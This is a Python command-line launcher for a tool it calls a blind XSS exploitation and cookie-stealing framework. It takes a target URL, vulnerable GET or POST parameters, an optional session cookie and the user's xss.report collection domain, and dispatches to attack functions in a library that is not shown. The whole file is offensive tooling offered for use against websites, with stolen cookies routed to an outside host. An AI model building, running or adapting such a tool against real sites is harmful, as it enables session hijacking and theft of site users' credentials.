#!/usr/bin/python3

from attacks_lib import AttackPostValues, AttackGetValues, AttackHeaderValues
from attacks_lib import AttackPostValuesAuth, AttackGetValuesAuth, AttackHeaderValuesAuth
from helperfuncs_lib import Banner, Clear
from sys import argv, exit
import argparse

parser = argparse.ArgumentParser(description=" ~ [ Xss.Report Exploitation Freamwork ] ~ ")
parser.add_argument('-t', '--target', help=' [Target URL] ')
parser.add_argument('-u', '--user', help=' [YOUR xss.report DOMAIN NAME]')
parser.add_argument('-p', '--post', help=' [VULNERABLE POST PARAMETHER] ')
parser.add_argument('-g', '--get', help=' [VULNERABLE GET PARAMETHER] ')
parser.add_argument('-c', '--cookie', help=' [COOKIE FOR AUTH (If needful) ]')

args = parser.parse_args()

if not len(argv) > 1:
    parser.print_help()
    exit(1)


def Helprr():
    print( "Authenticated & Unauthenticated POST,GET,HTTPHEADER blind xss exploitation & cookie stealing freamwork.")
    print("In order to use it, you must be registered to the https://xss.report/ System.")
    parser.print_help()
    exit(1)


def main():
    try:
        target = args.target
        user = args.user
        post = args.post
        get = args.get
        cookies = args.cookie

        
        if args.target and args.user is not None:

            if args.post and args.cookie is not None:
                AttackPostValuesAuth(target, user, post, cookies)   
            elif args.post is not None:
                AttackPostValues(target, user, post)
            elif args.get and args.cookie is not None:
                AttackGetValuesAuth(target, user, get, cookies)
            elif args.get is not None:     
                AttackGetValues(target, user, get)    
            elif args.target and args.cookie is not None:
                AttackHeaderValuesAuth(target, user, cookies)      
            else:
                AttackHeaderValues(target, user)

        else:
            Clear()
            Helprr()
            exit(1)        


    except Exception as e:
        Clear()
        Banner()
        Helprr()
        print(e)

if __name__ == '__main__':
    try:
        exit(main())
    except KeyboardInterrupt as e:
        print("^C")
